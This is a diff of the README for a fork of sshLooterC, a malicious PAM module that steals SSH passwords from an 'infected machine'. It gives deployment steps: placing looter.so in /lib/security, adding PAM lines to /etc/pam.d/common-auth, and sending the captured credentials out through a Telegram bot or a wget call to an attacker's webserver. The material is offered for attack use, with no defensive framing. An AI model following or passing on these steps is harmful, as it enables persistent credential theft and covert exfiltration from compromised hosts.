@@ -1,23 +1,31 @@
-# SSHLooter C version
-It's the C version of [sshLooter](https://github.com/mthbernardes/sshLooter), which was written in python and have a lot of dependencies to be installed on the infected machine.
-Now with this C version, you compile it on your machine and send it to the infected machine without installing any dependencies.
+# sshLooterC forked
+<pre>
+https://github.com/mthbernardes/sshLooterC<br/>
 
-# Dependencies
-* gcc
-* libcurl4-openssl-dev
-* libpam0g-dev
+# Changes from the original project
+* Removed libcurl4-openssl-dev dependency, now using system("wget ...")
+* Compiled for 32bit arch, should work for 64bit as well, you need to install gcc-multilib on the attacker machine
+</pre>
 
-# Configure
-Edit the `looter.c` and add your telegram bot token and your user id.
+# Install and configuration
+<pre>
+See the original project
+</pre>
 
-# Compiling
-```bash
-make
-```
+# Note on Telegram configuration
+<pre>
+Install a client (mobile or desktop), request a new bot @botfather, then ask @userinfobot to get your user id to be used in conjunction with the bot API key.
+Alternatively you can expose your logic on a webserver to read the query string with the leaked data and change the wget URL in looter.c
+</pre>
 
 # Usage
-Copy the `looter.so` to the infected machine on `/lib/security`, then edit the `/etc/pam.d/common-auth` and add the following lines.
-```
-auth optional module.so
-account optional module.so
-```
+<pre>
+See the original project, please note that you have to modify the /etc/pam.d/common-auth file inserting looter.so, according to the compilation instructions
+</pre>
+
+# Credits
+<a href="https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html" target="_blank">Stealing SSH credentials Another Approach.</a>
+<br/>
+Thank you
+
+ 
